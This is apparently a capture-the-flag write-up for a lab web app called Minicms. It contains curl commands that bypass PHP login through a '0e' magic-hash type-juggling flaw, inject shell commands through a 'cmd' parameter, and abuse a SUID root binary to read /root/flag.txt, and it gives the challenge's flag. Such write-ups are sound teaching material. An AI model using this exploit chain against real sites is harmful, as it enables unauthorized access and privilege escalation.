### Minicms

We found this web app where users host a simple CMS together.
There's something strange about the way they handle their users.

Btw, we **compared** minicms to wordpress, and it's much better!

### Solution

Let's browse through the website to find something useful

```bash
curl http://localhost:8000/users
curl http://localhost:8000/users.json
```

These two endpoints show us the user list, in `users.json` is more verbose as there are password hashes as well, which tells us perhaps user passwords are checked against these hashes. They are hex strings of length 64, which leads us to think that this may be SHA256.

```json
{
    "id": "1",
    "name": "John",
    "surname": "Doe",
    "email": "john.doe@miniature-cms.com",
    "password": "d6a021954bfa75c3a702d916304fcaa96d9a7af6097af1845cbed4d663c3cc14"
}
```

Out of all hashes one stands out the most

```json
{
    "id": "13",
    "name": "Leo",
    "surname": "White",
    "email": "leo.white@miniature-cms.com",
    "password": "0e15912394876120948217340912387412309482137409128742039484444444"
}
```

Hash used by Leo White consists of `0e` followed by 62 digits. 

```bash
curl localhost:8000 -v

< HTTP/1.1 200 OK
< Host: localhost:8000
< Date: Mon, 19 May 2025 05:24:43 GMT
< Connection: close
< X-Powered-By: PHP/8.0.30
< Content-type: text/html;charset=UTF-8
```

Now we are sure the website uses PHP as an underlying backend technology. Let's try to log in using type juggling vulnerability.

```plaintext
| forged password | ---(SHA256)---> | 0e... |
```

Which is then understood by PHP as scientific notation `0^... = 0`. A list of passwords with this feature can, for example, be seen [here](https://github.com/spaze/hashes/blob/master/sha256.md).

```bash
$ curl -X POST http://localhost:8000/auth/login -H "Content-Type: application/json" -d '{"email": "leo.white@miniature-cms.com", "password": "jF7qQUmx70"}'
{"message":"Login successful","token":"120349812450928137590234857230945823745"}
```

We now have a token and can use the `/files` endpoint

```bash
curl -X POST "http://localhost:8000/files?cmd=ls%20/home/minicms/%20&token=120349812450928137590234857230945823745" 
curl -X POST "http://localhost:8000/files?cmd=ls%20-lah%20/home/minicms/%20&token=120349812450928137590234857230945823745"
```

One of the files in home directory has the suid bit set

```bash
-rwsr-xr-x 1 root    root     17K May  9 18:23 file_JeqsmJ6xwH.bin
```

Let's use it to our advantage:

```bash
curl -X POST "http://localhost:8000/files?cmd=%2Fhome%2Fminicms%2Ffile_JeqsmJ6xwH.bin%20\"cat%20%2Froot%2Fflag.txt\"&token=120349812450928137590234857230945823745"
<pre>BtSCTF{juggl3_php_qu173_4444w3s0m3}</pre>%   
```

We obtain the flag:

```bash
<pre>BtSCTF{juggl3_php_qu173_4444w3s0m3}</pre>
```
